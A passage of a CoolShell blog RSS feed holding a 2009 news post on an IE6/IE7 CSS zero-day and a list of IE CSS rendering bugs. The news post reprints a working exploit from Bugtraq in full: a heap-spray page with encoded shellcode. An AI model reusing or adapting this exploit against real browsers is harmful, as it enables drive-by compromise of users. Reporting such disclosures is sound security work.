+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/04/Green-Computing-150x150.jpg" alt="做个环保主义的程序员" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a></li><li ><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="10大经典错误" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a></li><li ><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-150x150.png" alt="新浪微博的XSS攻击" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_title">新浪微博的XSS攻击</a></li><li ><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/7.jpg" alt="开源中最好的Web开发的资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_title">开源中最好的Web开发的资源</a></li><li ><a href="https://coolshell.cn/articles/3921.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/03/IE6-Countdown-150x150.png" alt="中国仍是IE6的重灾区" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3921.html" class="wp_rp_title">中国仍是IE6的重灾区</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/2357.html">一个jQuery的插件</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/2357.html/feed</wfw:commentRss>
+			<slash:comments>23</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>IE6/IE7 0day 漏洞</title>
+		<link>https://coolshell.cn/articles/1835.html</link>
+					<comments>https://coolshell.cn/articles/1835.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sun, 22 Nov 2009 16:52:14 +0000</pubDate>
+				<category><![CDATA[技术新闻]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[0day]]></category>
+		<category><![CDATA[IE]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1835</guid>
+
+					<description><![CDATA[<p>昨天（2009年11月21日），Symantec发布了IE的一个0day安全漏洞的消息。关于这个消息，截止本文发布时，在中文社区里还没有报导。这是一个关于IE6...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1835.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1835.html">IE6/IE7 0day 漏洞</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script></p>
+<div>
+<p>昨天（2009年11月21日），Symantec发布了<a href="http://www.symantec.com/connect/blogs/zero-day-internet-explorer-exploit-published" target="_blank">IE的一个0day安全漏洞的消息</a>。关于这个消息，截止本文发布时，在中文社区里还没有报导。这是一个关于IE6/IE7处理CSS时的一个漏洞（<a href="https://coolshell.cn/articles/1817.html" target="_blank">关于IE和CSS的BUG</a>）。如果你目前还在使用IE6/IE7，那你现在可能是你升级的时候了，当然，有很多人说IE8是没有问题的，但我个人还是建议在补丁出来之前先使用Firefox或Chrome。</p>
+<p>根据Symantec的的报告，他们在第一时间内测试了那个“Exploit Code”（攻击代码），根据测试结果表时，那个JavaScript的攻击代码并不是100%的可靠，而且很不可靠，但安全专家相信，100%完全可靠的“攻击代码”将会马上出现。这意味着，这段攻击代码会马上如潮水一样地放在各个有恶意的网站上，然后，所有的IE6/IE7的，打开JavaScript的用户都会被危及。</p>
+<p>目前，这段攻击代码，虽然很不可靠，但已经被证明在IE6/IE7的 Windows XP SP3上是可靠的，目前还没有相关报告说明有多少台电脑中招了，但我相信，在过去的这个周末，一定有一些人在拼命地在改善这段攻击代码，他们要赶在相关的补丁出来之前。而Microsoft，相信他还是和以前一样，一定要等到攻击很广泛的时候才会开始真正把补丁提上日程。</p>
+<p>最后，说一下攻击代码，这个代码是在<a href="http://seclists.org/bugtraq/2009/Nov/148" target="_blank">Bugtraq邮件组</a>中，这段攻击代码如下所示，这段代码攻击性并不可靠。</p>
+<p><span id="more-1835"></span></p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;!--
+securitylab.ir
+K4mr4n_st () yahoo com
+--&gt;
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;
+&quot;&lt;a href=&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&lt;/a&gt;&quot;;&gt;
+&lt;HTML xmlns=&lt;a href=&quot;http://www.w3.org/1999/xhtml&quot;&gt;http://www.w3.org/1999/xhtml&lt;/a&gt;;&gt;
+    &lt;HEAD&gt;
+&lt;script&gt;  
+            function load(){
+                var e;
+                e=document.getElementsByTagName(&quot;STYLE&quot;)[0];
+                e.outerHTML=&quot;1&quot;;
+            }
+        &lt;/script&gt;    
+        &lt;STYLE type=&quot;text/css&quot;&gt;
+            body{ overflow: scroll; margin: 0; }
+        &lt;/style&gt;
+       
+        &lt;SCRIPT language=&quot;javascript&quot;&gt;
+var shellcode =
+unescape(&quot;%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063&quot;);
+var bigblock = unescape(&quot;%u9090%u9090&quot;);
+var headersize = 20;
+var slackspace = headersize+shellcode.length;
+while (bigblock.length&lt;slackspace) bigblock+=bigblock;
+fillblock = bigblock.substring(0, slackspace);
+block = bigblock.substring(0, bigblock.length-slackspace);
+while(block.length+slackspace&lt;0x40000) block = block+block+fillblock;
+memory = new Array();
+for (x=0; x&lt;4000; x++) memory[x] = block + shellcode;
+&lt;/script&gt;
+ 
+    &lt;/HEAD&gt;   
+    &lt;BODY onload=&quot;load()&quot;&gt;
+    &lt;/BODY&gt;
+&lt;/HTML&gt;</pre>
+<p> </p>
+</div>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/04/Green-Computing-150x150.jpg" alt="做个环保主义的程序员" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a></li><li ><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="10大经典错误" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a></li><li ><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-150x150.png" alt="新浪微博的XSS攻击" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_title">新浪微博的XSS攻击</a></li><li ><a href="https://coolshell.cn/articles/3921.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/03/IE6-Countdown-150x150.png" alt="中国仍是IE6的重灾区" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3921.html" class="wp_rp_title">中国仍是IE6的重灾区</a></li><li ><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/03/affc-image1-150x150.png" alt="微软用新浪来当反面教材" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_title">微软用新浪来当反面教材</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1835.html">IE6/IE7 0day 漏洞</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1835.html/feed</wfw:commentRss>
+			<slash:comments>3</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>IE的CSS相关的BUG</title>
+		<link>https://coolshell.cn/articles/1245.html</link>
+					<comments>https://coolshell.cn/articles/1245.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Wed, 12 Aug 2009 10:47:43 +0000</pubDate>
+				<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[Browser]]></category>
+		<category><![CDATA[CSS]]></category>
+		<category><![CDATA[IE]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1245</guid>
+
+					<description><![CDATA[<p>这个网页（http://haslayout.net/css/index）上例举了所有的IE和CSS相关的BUG。如果你在开发网页的时候，你需要看看。 目前，这个...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1245.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1245.html">IE的CSS相关的BUG</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright" title="ie-bug" src="../wp-content/uploads/2009/08/ie-bug.jpg" alt="ie-bug" width="172" height="172" />这个网页（<a href="http://haslayout.net/css/index">http://haslayout.net/css/index</a>）上例举了所有的IE和CSS相关的BUG。如果你在开发网页的时候，你需要看看。</p>
+<p>目前，这个网站上包含了 <strong>28 个“普通的Bug”</strong> ， <strong>4 个“布局方面的Bug”</strong> ， <strong>6 个“可以绕开的Bug”</strong> 以及 <strong>1 个“IE崩溃的Bug”</strong>，所有的这些Bug有39个指南和48个解决方法。这个列表目前更新到 <strong>2009年8月11日，19:50:22 </strong></p>
+<p>下面是所有的bug列表，你可以点击每个BUG名的链接查看更详细的说明。</p>
+<h4>普通Bug</h4>
+<p>这部分 <abbr title="Internet Explorer">IE</abbr> 的 bug 是比较普通的无法归到其它种类，或是同时属于多个种类的Bug。</p>
+<p><span id="more-1245"></span></p>
+<table border="0">
+<thead>
+<tr>
+<th>名称</th>
+<th>IE的版本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a title="'Hover White Background Ignore Bug' tutorial" href="http://haslayout.net/css/view?tut=Hover-White-Background-Ignore-Bug">Hover White Background Ignore Bug</a></td>
+<td>IE7</td>
+<td>background 不会因为 :hover而改变</td>
+</tr>
+<tr>
+<td><a title="'IE7 Child Selector Comment Bug' tutorial" href="http://haslayout.net/css/view?tut=IE7-Child-Selector-Comment-Bug">IE7 Child Selector Comment Bug</a></td>
+<td>IE7</td>
+<td>一个 selector 包含了一个子的selector，如果后面跟着一个注释，则会被完全忽略。</td>
+</tr>
+<tr>
+<td><a title="'Star HTML Bug' tutorial" href="http://haslayout.net/css/view?tut=Star-HTML-Bug">Star HTML Bug</a></td>
+<td>IE6</td>
+<td>* html selector 在 IE6 中没有被忽略</td>
+</tr>
+<tr>
+<td><a title="'IE6 !important Ignore Bug' tutorial" href="http://haslayout.net/css/view?tut=IE6--important-Ignore-Bug">IE6 !important Ignore Bug</a></td>
+<td>IE6</td>
+<td>!important 关键字会忽略，如果有相同的属性被设置了</td>
+</tr>
+<tr>
+<td><a title="'PNG Image and Background Color Mismatch' tutorial" href="http://haslayout.net/css/view?tut=PNG-Image-and-Background-Color-Mismatch">PNG Image and Background Color Mismatch</a></td>
+<td>IE8 及以下版本</td>
+<td>背景颜色和指定的图片的颜色不一致。而他们本来是一致的。IE认为这是他一个Feature。太可笑了。</td>
+</tr>
+<tr>
+<td><a title="'No Auto Margin Center Pseudo-Bug' tutorial" href="http://haslayout.net/css/view?tut=No-Auto-Margin-Center-Pseudo-Bug">No Auto Margin Center Pseudo-Bug</a></td>
+<td>IE8 及以下版本</td>
+<td>如果把margins 设置成 <code data-enlighter-language="raw" class="EnlighterJSRAW">auto</code> ，IE不会把组件放置在中间的位置。所有的浏览器都会，只有IE不会。</td>
+</tr>
+<tr>
+<td><a title="':first-line !important Rule Ignore Bug' tutorial" href="http://haslayout.net/css/view?tut=-first-line--important-Rule-Ignore-Bug">:first-line !important Rule Ignore Bug</a></td>
+<td>IE8</td>
+<td>如果在伪class  :first-line 内使用!important，那么其所有定义会被忽略。</td>
+</tr>
+<tr>
+<td><a title="':first-letter Ignore Bug' tutorial" href="http://haslayout.net/css/view?tut=-first-letter-Ignore-Bug">:first-letter Ignore Bug</a></td>
+<td>IE6</td>
+<td>整个:first-letter 的属性定义会被除数完全忽略。</td>
+</tr>
+<tr>
+<td><a title="':first-letter !important Rule Ignore Bug' tutorial" href="http://haslayout.net/css/view?tut=-first-letter--important-Rule-Ignore-Bug">:first-letter !important Rule Ignore Bug</a></td>
+<td>IE8</td>
+<td>如果在伪class  :first-letter内使用!important，那么其所有定义会被忽略。</td>
+</tr>
+<tr>
+<td><a title="'Partial Click Bug v2' tutorial" href="http://haslayout.net/css/view?tut=Partial-Click-Bug-v2">Partial Click Bug v2</a></td>
+<td>IE8以</td>
+<td>设置了整个区域是可以点击的，但在IE中只有文本可以点击。</td>
+</tr>
+<tr>
+<td><a title="'Staircase Bug' tutorial" href="http://haslayout.net/css/view?tut=Staircase-Bug">Staircase Bug</a></td>
+<td>below IE8</td>
+<td>浮动的元素排序起来就像一个楼梯。</td>
+</tr>
+<tr>
+<td><a title="'Disappearing List Background Bug' tutorial" href="http://haslayout.net/css/view?tut=Disappearing-List-Background-Bug">Disappearing List Background Bug</a></td>
+<td>IE6</td>
+<td>B &lt;li&gt;, &lt;dt&gt;, &lt;dd&gt; 没有背景。</td>
+</tr>
+<tr>
+<td><a title="'noscript Ghost Bug' tutorial" href="http://haslayout.net/css/view?tut=noscript-Ghost-Bug">noscript Ghost Bug</a></td>
+<td>IE8 and below</td>
+<td>&lt;noscript&gt; 标识中只有 borders/background 才有用。</td>
+</tr>
+<tr>
+<td><a title="'No Transparency Click Bug' tutorial" href="http://haslayout.net/css/view?tut=No-Transparency-Click-Bug">No Transparency Click Bug</a></td>
+<td>IE8 and below</td>
+<td>背景透明的图片在作为链接时，并且其“filter”被设置成了PNG透明，但其背景还是不可点击。</td>
+</tr>
+<tr>
+<td><a title="'List Drop Shift Bug' tutorial" href="http://haslayout.net/css/view?tut=List-Drop-Shift-Bug">List Drop Shift Bug</a></td>
+<td>IE8</td>
+<td>在&lt;li&gt;中的内容被换行了。</td>
+</tr>
+<tr>
+<td><a title="'No Increase on &lt;ol&gt; Numbers Bug' tutorial" href="http://haslayout.net/css/view?tut=No-Increase-on--ol--Numbers-Bug">No Increase on &lt;ol&gt; Numbers Bug</a></td>
+<td>below IE8</td>
+<td>&lt;ol&gt; 中的 &lt;li&gt; 列表序号不会增加。</td>
+</tr>
+<tr>
+<td><a title="'No Bullets on &lt;ul&gt; and &lt;ol&gt; Bug' tutorial" href="http://haslayout.net/css/view?tut=No-Bullets-on--ul--and--ol--Bug">No Bullets on &lt;ul&gt; and &lt;ol&gt; Bug</a></td>
+<td>below IE8</td>
+<td>在&lt;ul&gt; 和 &lt;ol&gt; 中看不到列表序号/数字了。</td>
+</tr>
+<tr>
+<td><a title="'No line-height Vertical Center on Images Bug' tutorial" href="http://haslayout.net/css/view?tut=No-line-height-Vertical-Center-on-Images-Bug">No line-height Vertical Center on Images Bug</a></td>
+<td>IE8以下版</td>
+<td>图片使用line-height 方法不能垂直居中</td>
+</tr>
+<tr>
+<td><a title="'No Background Image Bug' tutorial" href="http://haslayout.net/css/view?tut=No-Background-Image-Bug">No Background Image Bug</a></td>
+<td>IE8及以下版</td>
+<td>在IE中使用background无法定义背景图</td>
+</tr>
+<tr>
+<td><a title="'Custom Cursor Bug' tutorial" href="http://haslayout.net/css/view?tut=Custom-Cursor-Bug">Custom Cursor Bug</a></td>
+<td>IE8及以下版</td>
+<td>自定义鼠标不工作</td>
+</tr>
+<tr>
+<td><a title="'Leaking Background Bug' tutorial" href="http://haslayout.net/css/view?tut=Leaking-Background-Bug">Leaking Background Bug</a></td>
+<td>IE6</td>
+<td>背景从一个元件的内部溢出到外部</td>
+</tr>
+<tr>
+<td><a title="'Expanding Height Bug' tutorial" href="http://haslayout.net/css/view?tut=Expanding-Height-Bug">Expanding Height Bug</a></td>
+<td>IE6</td>
+<td>元件的高度比指定的要长得多。</td>
+</tr>
+<tr>
+<td><a title="'Expanding Width Bug' tutorial" href="http://haslayout.net/css/view?tut=Expanding-Width-Bug">Expanding Width Bug</a></td>
+<td>IE6</td>
+<td>元件的宽度比指定的要长得多。</td>
+</tr>
+<tr>
+<td><a title="'Double Margin Bug' tutorial" href="http://haslayout.net/css/view?tut=Double-Margin-Bug">Double Margin Bug</a></td>
+<td>IE6</td>
+<td>float元件的左和右的空白（margins）被加倍了。</td>
+</tr>
+<tr>
+<td><a title="'Negative Margin Bug' tutorial" href="http://haslayout.net/css/view?tut=Negative-Margin-Bug">Negative Margin Bug</a></td>
+<td>IE8以下版</td>
+<td>如果使用负数来指定页白（margins）里面的元件会被外面的元件所遮挡。</td>
+</tr>
+<tr>
+<td><a title="'Italics Float Bug' tutorial" href="http://haslayout.net/css/view?tut=Italics-Float-Bug">Italics Float Bug</a></td>
+<td>IE6</td>
+<td>float的元件中的字体会被设置成倾斜。</td>
+</tr>
+<tr>
+<td><a title="'3px Gap Bug aka Text Jog Bug' tutorial" href="http://haslayout.net/css/view?tut=3px-Gap-Bug-aka-Text-Jog-Bug">3px Gap Bug aka Text Jog Bug</a></td>
+<td>IE6</td>
+<td>下一个float的元件不是有一个3px的空隙，就是被换行了。</td>
+</tr>
+<tr>
+<td><a title="'Text-Align Bug' tutorial" href="http://haslayout.net/css/view?tut=Text-Align-Bug">Text-Align Bug</a></td>
+<td>IE8以下版</td>
+<td>text-align属性会影响整个元件内的所有内容。</td>
+</tr>
+</tbody>
+</table>
+<h4>布局类 Bug</h4>
+<table border="0">
+<caption>
+</caption>
+<thead>
+<tr>
+<th>名称</th>
+<th>IE的版本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a title="'Border Chaos Bug' tutorial" href="http://haslayout.net/css/view?tut=Border-Chaos-Bug">Border Chaos Bug</a></td>
+<td>IE6</td>
+<td>连框显示是混乱的</td>
+</tr>
+<tr>
+<td><a title="'Sub-Hover Bug' tutorial" href="http://haslayout.net/css/view?tut=Sub-Hover-Bug">Sub-Hover Bug</a></td>
+<td>IE6</td>
+<td>一些selectors 如 a:hover foo{} 无法正常工作</td>
+</tr>
+<tr>
+<td><a title="'Partial Click Bug' tutorial" href="http://haslayout.net/css/view?tut=Partial-Click-Bug">Partial Click Bug</a></td>
+<td>IE6</td>
+<td>在定义了display: block的链接中(&lt;a&gt;) 只有文本是可以点的。</td>
+</tr>
+<tr>
+<td><a title="'Disappearing Content Bug' tutorial" href="http://haslayout.net/css/view?tut=Disappearing-Content-Bug">Disappearing Content Bug</a></td>
+<td>IE6</td>
+<td>当我们滚动窗口的时候，或是最大化最小化窗品的时候，有一些内容会重复显示。</td>
+</tr>
+</tbody>
+</table>
+<h4>不支持的功能</h4>
+<table border="0">
+<thead>
+<tr>
+<th>名称</th>
+<th>IE的版本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a title="'No Child Selector Support Workaround' tutorial" href="http://haslayout.net/css/view?tut=No-Child-Selector-Support-Workaround">No Child Selector Support Workaround</a></td>
+<td>IE6</td>
+<td>子 selector 无效</td>
+</tr>
+<tr>
+<td><a title="'Max-Height Workaround' tutorial" href="http://haslayout.net/css/view?tut=Max-Height-Workaround">Max-Height Workaround</a></td>
+<td>IE6</td>
+<td>max-height 无效</td>
+</tr>
+<tr>
+<td><a title="'Max-Width Workaround' tutorial" href="http://haslayout.net/css/view?tut=Max-Width-Workaround">Max-Width Workaround</a></td>
+<td>IE6</td>
+<td>max-width 无效</td>
+</tr>
+<tr>
+<td><a title="'Opacity' tutorial" href="http://haslayout.net/css/view?tut=Opacity">Opacity</a></td>
+<td>IE8及以下版</td>
+<td>opacity 属性无效</td>
+</tr>
+<tr>
+<td><a title="'Min-Width Workaround' tutorial" href="http://haslayout.net/css/view?tut=Min-Width-Workaround">Min-Width Workaround</a></td>
+<td>IE6</td>
+<td>min-width 属性无效</td>
+</tr>
+<tr>
+<td><a title="'Min-Height Workaround' tutorial" href="http://haslayout.net/css/view?tut=Min-Height-Workaround">Min-Height Workaround</a></td>
+<td>IE6</td>
+<td>min-height 属性无效</td>
+</tr>
+</tbody>
+</table>
+<h4>程序崩溃 Bug</h4>
+<p>这个BUG可以导致整个 <abbr title="Internet Explorer">IE</abbr> 崩溃。</p>
+<table border="0">
+<thead>
+<tr>
+<th>名称</th>
+<th>IE的版本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a title="'Hover Crash Bug' tutorial" href="http://haslayout.net/css/view?tut=Hover-Crash-Bug">Hover Crash Bug</a></td>
+<td>IE6</td>
+<td>当你把鼠标移上 :hover 的链接时，浏览器会崩溃</td>
+</tr>
+</tbody>
+</table>
+<p>(全文完)<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/09/biolab-150x150.jpg" alt="一些非常有意思的杂项资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a></li><li ><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/01/pretty-code-150x150.gif" alt="Chrome开发者工具的小技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a></li><li ><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/05/Render-Process-150x150.jpg" alt="浏览器的渲染原理简介" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a></li><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/04/Green-Computing-150x150.jpg" alt="做个环保主义的程序员" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a></li><li ><a href="https://coolshell.cn/articles/6913.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/10.jpg" alt="神奇的CSS形状 " width="150" height="150" /></a><a href="https://coolshell.cn/articles/6913.html" class="wp_rp_title">神奇的CSS形状 </a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1245.html">IE的CSS相关的BUG</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1245.html/feed</wfw:commentRss>
+			<slash:comments>7</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
